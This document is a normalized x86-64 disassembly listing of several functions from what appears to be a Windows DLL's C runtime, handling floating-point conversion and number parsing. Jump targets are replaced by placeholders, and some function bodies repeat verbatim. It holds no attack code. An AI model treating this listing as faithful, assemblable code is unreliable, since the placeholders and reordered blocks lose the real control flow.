cmp [ rsp + 0x58 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x58 ] 0x0
je r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0xa0 ]
add rsp 0x80
pop rdi
retn
xor eax eax
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180020c8c
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_18000d428
lea r11 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rsp + 0x68 ]
xor r9d r9d
mov r8 rbx
call sub_180021c2c
lea rcx [ rsp + 0x68 ]
mov rdx rdi
mov ebx eax
call sub_180021628
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x58 ] 0x0
je r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x78 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0xa0 ]
add rsp 0x80
pop rdi
retn
xor eax eax
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180020d90
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov r10 [ r9 + 0x10 ]
mov rbx rcx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180010834
mov ebx 0x16
xor eax eax
test r8d r8d
mov [ rcx ] 0x0
cmovg eax r8d
inc eax
cdqe
cmp rdx rax
ja r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rcx ] 0x30
lea rax [ rcx + 0x1 ]
jmp r-xdata
call sub_180010834
mov ebx 0x22
jmp r-xdata
test r8d r8d
jg r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
jmp r-xdata
cmp [ r10 ] 0x0
je r-xdata
mov [ rax ] 0x0
js r-xdata
mov ecx 0x30
movsx ecx [ r10 ]
inc r10
jmp r-xdata
cmp [ rbx ] 0x31
jne r-xdata
cmp [ r10 ] 0x35
jl r-xdata
mov [ rax ] cl
inc rax
dec r8d
lea rcx [ rbx + 0x1 ]
call sub_1800174b0
lea rdx [ rbx + 0x1 ]
mov rcx rbx
lea r8 [ rax + 0x1 ]
call sub_1800160e0
inc [ r9 + 0x4 ]
jmp r-xdata
jmp r-xdata
xor eax eax
dec rax
cmp [ rax ] 0x39
je r-xdata
mov [ rax ] 0x30
inc [ rax ]
sub_180020e6c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
movzx r10d [ rdx + 0x6 ]
mov r11d [ rdx + 0x4 ]
mov eax 0x8000
mov r8w r10w
and r10w ax
mov edi 0x7ff
shr r8w 0x4
and r11d 0xfffff
mov r9 rcx
mov ecx [ rdx ]
and r8w di
mov ebx 0x80000000
movzx eax r8w
test eax eax
je r-xdata
test r11d r11d
jne r-xdata
cmp eax edi
je r-xdata
mov eax 0x3c01
add r8w ax
xor ebx ebx
test ecx ecx
jne r-xdata
mov r8d 0x7fff
jmp r-xdata
mov eax 0x3c00
add r8w ax
jmp r-xdata
or r10w r8w
mov ecx [ r9 ]
mov edx [ r9 + 0x4 ]
add edx edx
mov eax ecx
shr eax 0x1f
or edx eax
lea eax [ rcx + rcx ]
mov [ r9 ] eax
mov eax 0xffff
mov [ r9 + 0x4 ] edx
add r8w ax
bt edx 0x1f
jae r-xdata
and [ r9 + 0x4 ] ecx
and [ r9 ] ecx
jmp r-xdata
mov eax ecx
shl r11d 0xb
shl ecx 0xb
shr eax 0x15
mov [ r9 ] ecx
or eax r11d
or eax ebx
bt eax 0x1f
mov [ r9 + 0x4 ] eax
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
mov [ r9 + 0x8 ] r10w
retn
sub_180020f44
push rbx
push rsi
push rdi
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rdi rdx
mov [ rsp + 0x30 ] rcx
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
mov rbx r9
mov rsi r8
call sub_180020e6c
lea rcx [ rsp + 0x40 ]
lea r11 [ rsp + 0x30 ]
mov rax [ rcx ]
xor r8d r8d
lea r9 [ rsp + 0x50 ]
mov [ r11 ] rax
movzx eax [ rcx + 0x8 ]
lea edx [ r8 + 0x11 ]
lea rcx [ rsp + 0x30 ]
mov [ r11 + 0x8 ] ax
call sub_180022528
lea r8 [ rsp + 0x54 ]
mov rdx rbx
mov [ rdi + 0x8 ] eax
movsx eax [ rsp + 0x52 ]
mov rcx rsi
mov [ rdi ] eax
movsx eax [ rsp + 0x50 ]
mov [ rdi + 0x4 ] eax
call sub_18001695c
test eax eax
je r-xdata
mov [ rdi + 0x10 ] rsi
mov rax rdi
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180017570
add rsp 0x80
pop rdi
pop rsi
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
sub_180021024
mov [ rsp + 0x10 ] rdx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
lea esi [ rbx + 0x1 ]
mov [ rsp + 0x80 ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rsp + 0x20 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rsp + 0x24 ] eax
movzx eax [ rcx ]
shl eax 0x10
mov [ rsp + 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rsp + 0x20 ]
mov r11d r15d
mov rax [ rcx ]
or r13d 0xffffffff
mov [ rsp + 0x90 ] edi
mov [ rsp + 0x30 ] rax
mov eax [ rcx + 0x8 ]
mov r12d ebx
mov [ rsp + 0x38 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sar r10d 0x5
sub eax edx
movsxd r14 r10d
sub r11d eax
mov ecx [ rsp + r14 * 4 + 0x20 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov rax rbx
mov ecx r11d
mov eax r13d
shl eax cl
and [ rsp + r14 * 4 + 0x20 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx 0x3
jge r-xdata
mov ecx r11d
mov eax r13d
movsxd r8 r10d
shl eax cl
not eax
test [ rsp + r8 * 4 + 0x20 ] eax
jne r-xdata
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax 0x3
jl r-xdata
cmp r12d ebx
je r-xdata
lea rcx [ rsp + rdx * 4 + 0x20 ]
mov r8d 0x3
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180016870
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rsp + r9 * 4 + 0x20 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rsp + 0x80 ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rsp + 0x20 ]
cmp eax 0x40
jne r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r12d esi
cmp ecx edx
jae r-xdata
cmp rax 0x3
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rsp + 0x24 ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
cmp r12d ebx
je r-xdata
sub r8d esi
mov [ rsp + r9 * 4 + 0x20 ] ecx
movsxd rdx r8d
cmp rdx rbx
jl r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rsp + 0x90 ]
lea rax [ rsp + 0x30 ]
mov r11d r13d
mov rcx [ rax ]
mov r12d 0x20
mov r9d ebx
mov [ rsp + 0x20 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rsp + 0x28 ] ecx
mov r8 rbx
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov edi eax
shl r11d cl
sub r12d eax
not r11d
mov rdx [ rsp + 0x88 ]
mov eax [ rsp + rdx * 4 + 0x20 ]
mov r12d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rsp + 0x20 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r12d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
mov r9 rbx
shl r13d cl
sub r12d eax
not r13d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rsp + 0x20 ] rbx
bts [ rsp + 0x20 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rsp + 0x28 ] ebx
shl r13d cl
mov r11d eax
mov r9d ebx
not r13d
mov r8 rbx
sub edi eax
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r12d
or edx r9d
and eax r11d
mov [ rsp + 0x90 ] eax
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
mov r9d [ rsp + 0x90 ]
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd r8 r10d
lea rdx [ rsp + 0x28 ]
mov edi 0x2
mov rax r8
mov rcx rdi
shl rax 0x2
sub rdx rax
mov r12d esi
cmp r8d esi
jae r-xdata
mov edx [ rsp + r9 * 4 + 0x20 ]
mov ecx edi
mov eax r13d
and eax edx
shr edx cl
mov ecx r12d
or edx r10d
mov [ rsp + 0x90 ] eax
mov r10d [ rsp + 0x90 ]
mov [ rsp + r9 * 4 + 0x20 ] edx
add r9 rsi
shl r10d cl
cmp r9 0x3
jl r-xdata
movsxd rdx r11d
lea rcx [ rsp + 0x28 ]
mov edi 0x2
mov rax rdx
shl rax 0x2
sub rcx rax
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx r11d
mov eax r13d
and eax edx
shr edx cl
mov ecx edi
or edx r9d
mov [ rsp + 0x90 ] eax
mov r9d [ rsp + 0x90 ]
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd rdx r10d
lea rcx [ rsp + 0x28 ]
mov edi 0x2
mov rax rdx
shl rax 0x2
sub rcx rax
mov [ rsp + rcx * 4 + 0x20 ] ebx
mov eax [ rdx ]
mov [ rsp + rcx * 4 + 0x20 ] eax
jmp r-xdata
mov [ rsp + rdx * 4 + 0x20 ] r8d
sub rdx rsi
jns r-xdata
mov [ rsp + rdi * 4 + 0x20 ] ebx
mov eax [ rcx ]
mov [ rsp + rdi * 4 + 0x20 ] eax
jmp r-xdata
mov [ rsp + rdi * 4 + 0x20 ] ebx
mov eax [ rcx ]
mov [ rsp + rdi * 4 + 0x20 ] eax
jmp r-xdata
cmp rcx r8
jl r-xdata
mov r9d [ rw-data ]
mov r12d r15d
mov eax r9d
cdq
and edx r15d
add eax edx
mov r11d eax
and eax r15d
sar r11d 0x5
sub eax edx
movsxd r14 r11d
sub r12d eax
mov ecx [ rsp + r14 * 4 + 0x20 ]
bt ecx r12d
jae r-xdata
sub rcx rsi
sub rdx 0x4
cmp rcx rbx
jge r-xdata
cmp rdi rdx
jl r-xdata
sub rdi rsi
sub rcx 0x4
cmp rdi rbx
jge r-xdata
cmp rdi rdx
jl r-xdata
mov ecx [ rw-data ]
mov r8d [ rw-data ]
mov ebx esi
add r8d ecx
jmp r-xdata
sub rdi rsi
sub rcx 0x4
cmp rdi rbx
jge r-xdata
mov ecx r12d
mov eax r13d
shl eax cl
and [ rsp + r14 * 4 + 0x20 ] eax
lea eax [ r11 + 0x1 ]
movsxd rdx eax
cmp rdx 0x3
jge r-xdata
mov ecx r12d
mov eax r13d
movsxd r8 r11d
shl eax cl
not eax
test [ rsp + r8 * 4 + 0x20 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r12d 0x20
mov r9d ebx
inc eax
mov r8 rbx
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r13d cl
sub r12d eax
not r13d
lea rcx [ rsp + rdx * 4 + 0x20 ]
mov r8d 0x3
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180016870
lea eax [ r9 - 0x1 ]
mov ecx r15d
mov r9d esi
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r10 r8d
mov eax [ rsp + r10 * 4 + 0x20 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r12d
or edx r9d
and eax r13d
mov [ rsp + 0x90 ] eax
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
mov r9d [ rsp + 0x90 ]
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd r8 r10d
lea rdx [ rsp + 0x28 ]
mov rcx rdi
mov rax r8
shl rax 0x2
sub rdx rax
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax 0x3
jl r-xdata
mov [ rsp + rcx * 4 + 0x20 ] ebx
mov eax [ rdx ]
mov [ rsp + rcx * 4 + 0x20 ] eax
jmp r-xdata
cmp ecx ebx
je r-xdata
sub r8d esi
mov [ rsp + r10 * 4 + 0x20 ] edx
movsxd rdx r8d
cmp rdx rbx
jl r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
cmp rcx r8
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub rcx rsi
sub rdx 0x4
cmp rcx rbx
jge r-xdata
mov eax [ rsp + rdx * 4 + 0x20 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rsp + rdx * 4 + 0x20 ] r8d
sub rdx rsi
jns r-xdata
sub_180021628
mov [ rsp + 0x10 ] rdx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
lea esi [ rbx + 0x1 ]
mov [ rsp + 0x80 ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rsp + 0x20 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rsp + 0x24 ] eax
movzx eax [ rcx ]
shl eax 0x10
mov [ rsp + 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rsp + 0x20 ]
mov r11d r15d
mov rax [ rcx ]
or r13d 0xffffffff
mov [ rsp + 0x90 ] edi
mov [ rsp + 0x30 ] rax
mov eax [ rcx + 0x8 ]
mov r12d ebx
mov [ rsp + 0x38 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sar r10d 0x5
sub eax edx
movsxd r14 r10d
sub r11d eax
mov ecx [ rsp + r14 * 4 + 0x20 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov rax rbx
mov ecx r11d
mov eax r13d
shl eax cl
and [ rsp + r14 * 4 + 0x20 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx 0x3
jge r-xdata
mov ecx r11d
mov eax r13d
movsxd r8 r10d
shl eax cl
not eax
test [ rsp + r8 * 4 + 0x20 ] eax
jne r-xdata
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax 0x3
jl r-xdata
cmp r12d ebx
je r-xdata
lea rcx [ rsp + rdx * 4 + 0x20 ]
mov r8d 0x3
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180016870
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rsp + r9 * 4 + 0x20 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rsp + 0x80 ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rsp + 0x20 ]
cmp eax 0x40
jne r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r12d esi
cmp ecx edx
jae r-xdata
cmp rax 0x3
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rsp + 0x24 ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
cmp r12d ebx
je r-xdata
sub r8d esi
mov [ rsp + r9 * 4 + 0x20 ] ecx
movsxd rdx r8d
cmp rdx rbx
jl r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rsp + 0x90 ]
lea rax [ rsp + 0x30 ]
mov r11d r13d
mov rcx [ rax ]
mov r12d 0x20
mov r9d ebx
mov [ rsp + 0x20 ] rcx
mov ecx [ rax + 0x8 ]
mov eax edx
cdq
mov [ rsp + 0x28 ] ecx
mov r8 rbx
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov edi eax
shl r11d cl
sub r12d eax
not r11d
mov rdx [ rsp + 0x88 ]
mov eax [ rsp + rdx * 4 + 0x20 ]
mov r12d ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov r8d [ rw-data ]
btr [ rsp + 0x20 ] 0x1f
mov r11d eax
and eax r15d
add r8d edi
mov r12d 0x20
sub eax edx
sar r11d 0x5
mov r10d ebx
mov ecx eax
mov edi eax
mov r9 rbx
shl r13d cl
sub r12d eax
not r13d
mov r10d eax
and eax r15d
mov edi 0x20
sub eax edx
mov [ rsp + 0x20 ] rbx
bts [ rsp + 0x20 ] 0x1f
mov ecx eax
sar r10d 0x5
mov [ rsp + 0x28 ] ebx
shl r13d cl
mov r11d eax
mov r9d ebx
not r13d
mov r8 rbx
sub edi eax
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx edi
mov eax edx
shr edx cl
mov ecx r12d
or edx r9d
and eax r11d
mov [ rsp + 0x90 ] eax
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
mov r9d [ rsp + 0x90 ]
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd r8 r10d
lea rdx [ rsp + 0x28 ]
mov edi 0x2
mov rax r8
mov rcx rdi
shl rax 0x2
sub rdx rax
mov r12d esi
cmp r8d esi
jae r-xdata
mov edx [ rsp + r9 * 4 + 0x20 ]
mov ecx edi
mov eax r13d
and eax edx
shr edx cl
mov ecx r12d
or edx r10d
mov [ rsp + 0x90 ] eax
mov r10d [ rsp + 0x90 ]
mov [ rsp + r9 * 4 + 0x20 ] edx
add r9 rsi
shl r10d cl
cmp r9 0x3
jl r-xdata
movsxd rdx r11d
lea rcx [ rsp + 0x28 ]
mov edi 0x2
mov rax rdx
shl rax 0x2
sub rcx rax
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx r11d
mov eax r13d
and eax edx
shr edx cl
mov ecx edi
or edx r9d
mov [ rsp + 0x90 ] eax
mov r9d [ rsp + 0x90 ]
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd rdx r10d
lea rcx [ rsp + 0x28 ]
mov edi 0x2
mov rax rdx
shl rax 0x2
sub rcx rax
mov [ rsp + rcx * 4 + 0x20 ] ebx
mov eax [ rdx ]
mov [ rsp + rcx * 4 + 0x20 ] eax
jmp r-xdata
mov [ rsp + rdx * 4 + 0x20 ] r8d
sub rdx rsi
jns r-xdata
mov [ rsp + rdi * 4 + 0x20 ] ebx
mov eax [ rcx ]
mov [ rsp + rdi * 4 + 0x20 ] eax
jmp r-xdata
mov [ rsp + rdi * 4 + 0x20 ] ebx
mov eax [ rcx ]
mov [ rsp + rdi * 4 + 0x20 ] eax
jmp r-xdata
cmp rcx r8
jl r-xdata
mov r9d [ rw-data ]
mov r12d r15d
mov eax r9d
cdq
and edx r15d
add eax edx
mov r11d eax
and eax r15d
sar r11d 0x5
sub eax edx
movsxd r14 r11d
sub r12d eax
mov ecx [ rsp + r14 * 4 + 0x20 ]
bt ecx r12d
jae r-xdata
sub rcx rsi
sub rdx 0x4
cmp rcx rbx
jge r-xdata
cmp rdi rdx
jl r-xdata
sub rdi rsi
sub rcx 0x4
cmp rdi rbx
jge r-xdata
cmp rdi rdx
jl r-xdata
mov ecx [ rw-data ]
mov r8d [ rw-data ]
mov ebx esi
add r8d ecx
jmp r-xdata
sub rdi rsi
sub rcx 0x4
cmp rdi rbx
jge r-xdata
mov ecx r12d
mov eax r13d
shl eax cl
and [ rsp + r14 * 4 + 0x20 ] eax
lea eax [ r11 + 0x1 ]
movsxd rdx eax
cmp rdx 0x3
jge r-xdata
mov ecx r12d
mov eax r13d
movsxd r8 r11d
shl eax cl
not eax
test [ rsp + r8 * 4 + 0x20 ] eax
jne r-xdata
mov eax [ rw-data ]
mov r12d 0x20
mov r9d ebx
inc eax
mov r8 rbx
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
mov ecx eax
mov r11d eax
shl r13d cl
sub r12d eax
not r13d
lea rcx [ rsp + rdx * 4 + 0x20 ]
mov r8d 0x3
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_180016870
lea eax [ r9 - 0x1 ]
mov ecx r15d
mov r9d esi
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
sub ecx eax
movsxd r10 r8d
mov eax [ rsp + r10 * 4 + 0x20 ]
shl r9d cl
mov ecx ebx
lea edx [ rax + r9 ]
cmp edx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
mov edx [ rsp + r8 * 4 + 0x20 ]
mov ecx r11d
mov eax edx
shr edx cl
mov ecx r12d
or edx r9d
and eax r13d
mov [ rsp + 0x90 ] eax
mov [ rsp + r8 * 4 + 0x20 ] edx
add r8 rsi
mov r9d [ rsp + 0x90 ]
shl r9d cl
cmp r8 0x3
jl r-xdata
movsxd r8 r10d
lea rdx [ rsp + 0x28 ]
mov rcx rdi
mov rax r8
shl rax 0x2
sub rdx rax
mov ecx esi
cmp edx r9d
jae r-xdata
cmp rax 0x3
jl r-xdata
mov [ rsp + rcx * 4 + 0x20 ] ebx
mov eax [ rdx ]
mov [ rsp + rcx * 4 + 0x20 ] eax
jmp r-xdata
cmp ecx ebx
je r-xdata
sub r8d esi
mov [ rsp + r10 * 4 + 0x20 ] edx
movsxd rdx r8d
cmp rdx rbx
jl r-xdata
cmp [ rsp + rax * 4 + 0x20 ] ebx
jne r-xdata
jmp r-xdata
cmp rcx r8
jl r-xdata
mov r8d ebx
mov ebx edi
jmp r-xdata
sub rcx rsi
sub rdx 0x4
cmp rcx rbx
jge r-xdata
mov eax [ rsp + rdx * 4 + 0x20 ]
mov ecx ebx
lea r8d [ rax + 0x1 ]
cmp r8d eax
jb r-xdata
add rax rsi
mov ecx esi
cmp r8d esi
jae r-xdata
mov [ rsp + rdx * 4 + 0x20 ] r8d
sub rdx rsi
jns r-xdata
sub_180021c2c
mov r11 rsp
mov [ r11 + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov r12 [ rsp + 0x128 ]
xor ebx ebx
mov [ rsp + 0x38 ] r9d
lea r9d [ rbx + 0x1 ]
mov [ rsp + 0x48 ] rcx
mov r15 rdx
lea r10 [ r11 - 0x68 ]
mov [ rsp + 0x3c ] bx
mov edi ebx
mov [ rsp + 0x34 ] r9d
mov r13d ebx
mov [ rsp + 0x30 ] ebx
mov r14d ebx
mov ebp ebx
mov esi ebx
mov ecx ebx
cmp r12 rbx
jne r-xdata
mov r11 r8
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180010764
xor eax eax
jmp r-xdata
add r8 r9
jmp r-xdata
cmp al 0x9
je r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0x100 ]
add rsp 0xb0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al [ r8 ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov dl [ r8 ]
add r8 r9
cmp ecx 0x5
jg r-xdata
mov r9d ecx
sub r9d 0x6
je r-xdata
je r-xdata
lea eax [ rdx - 0x31 ]
lea r11 [ r8 - 0x2 ]
cmp al 0x8
jbe r-xdata
mov eax 0x1
sub r9d eax
je r-xdata
sub dl 0x30
mov [ rsp + 0x30 ] r9d
cmp dl 0x9
ja r-xdata
mov r9d ecx
cmp ecx ebx
je r-xdata
mov ecx 0x9
jmp r-xdata
cmp dl 0x2b
je r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
ja r-xdata
sub r9d eax
je r-xdata
mov r8 r11
jmp r-xdata
mov ecx 0x4
jmp r-xdata
lea eax [ rdx - 0x31 ]
cmp al 0x8
jbe r-xdata
mov eax 0x1
sub r9d eax
je r-xdata
mov r9d 0x1
mov ecx 0x7
cmp dl 0x2d
jne r-xdata
cmp dl 0x30
jne r-xdata
mov r9 rax
mov r14d r9d
jmp r-xdata
sub r9d eax
je r-xdata
mov [ r15 ] r8
cmp r13d ebx
je r-xdata
sub r8 r9
jmp r-xdata
mov ecx 0x3
mov rax [ r12 ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
cmp dl [ rax ]
je r-xdata
mov r9 rax
lea eax [ rdx - 0x31 ]
mov r13d r9d
cmp al 0x8
ja r-xdata
sub r9d eax
je r-xdata
mov r9d 0x1
jmp r-xdata
or [ rsp + 0x34 ] 0xffffffff
mov ecx 0x7
jmp r-xdata
mov r8 r11
mov ecx 0x8
jmp r-xdata
cmp dl 0x30
je r-xdata
mov r9 rax
mov r11b 0x30
mov r14d r9d
jmp r-xdata
cmp r9d 0x2
jne r-xdata
mov dx bx
mov ax bx
mov edi ebx
mov ecx ebx
mov ebx 0x4
cmp edi 0x18
jbe r-xdata
mov ecx 0x5
cmp dl 0x2b
je r-xdata
